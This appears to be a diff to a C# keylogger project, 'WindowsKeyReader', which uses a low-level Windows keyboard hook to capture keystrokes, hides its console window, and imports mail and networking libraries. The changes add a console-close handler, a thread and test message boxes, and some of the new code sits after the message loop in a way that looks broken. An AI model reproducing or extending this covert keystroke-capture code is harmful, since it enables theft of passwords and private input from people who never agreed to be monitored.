@@ -9,6 +9,7 @@ using System.Windows.Forms;//converting of keystrokes into readable keys
 using System.IO;
 using System.Net;
 using System.Net.Mail;
+using System.Threading;
 
 
 namespace WindowsKeyReader
@@ -21,20 +22,55 @@ namespace WindowsKeyReader
         private static IntPtr hook = IntPtr.Zero; //A read-only field that represents a pointer or handle that has been initialized to zero.
         private static LowLevelKeyboardProc proc = HookCallback;
         const int SW_HIDE = 0;
-        public static bool isClosing = false; //To see if the program is closing
+        static bool exitProc = false;
+        private delegate bool EventHandler(CtrlType had);
+        static EventHandler _handler;
+        
 
         static void Main(string[] args)
         {
             var handle = GetConsoleWindow();
-            ShowWindow(handle, SW_HIDE); //coment uit as wil cosole sien
+            //ShowWindow(handle, SW_HIDE); //coment uit as wil cosole sien
             hook = SetHook(proc);
             Application.Run();
             UnhookWindowsHookEx(hook);
 
+            _handler += new EventHandler(Handler);
+            SetConsoleCtrlHandler(_handler, true);
+            //Starts Thread here
+            Program p = new Program();
+            p.Start();
+
+            //Keeps the console to not run off
+            while(!exitProc)
+            {
+                Thread.Sleep(500);
+            }
         }
 
+        public void Start()
+        {
+            MessageBox.Show("Jipeee");
+        }
 
+        enum CtrlType
+        {
+            CTRL_C_EVENT = 0,
+            CTRL_BREAK_EVENT = 1,
+            CTRL_CLOSE_EVENT = 2,
+            CTRL_LOGOFF_EVENT = 5,
+            CTRL_SHUTDOWN_EVENT = 6
+        }
 
+        private static bool Handler(CtrlType had)
+        {
+            Thread.Sleep(5000);
+            MessageBox.Show("Cleanup complete");
+            exitProc = true;
+            Environment.Exit(-1);
+
+            return true;
+        }
 
         private static IntPtr SetHook(LowLevelKeyboardProc proc)
         {
@@ -86,9 +122,10 @@ namespace WindowsKeyReader
         }
 
         [DllImport("kernel32.dll")]
+        private static extern bool SetConsoleCtrlHandler(EventHandler handler, bool add);
+
+        [DllImport("kernel32.dll")]
         static extern IntPtr GetConsoleWindow();
-
-
 
         [DllImport("user32.dll")]
         static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
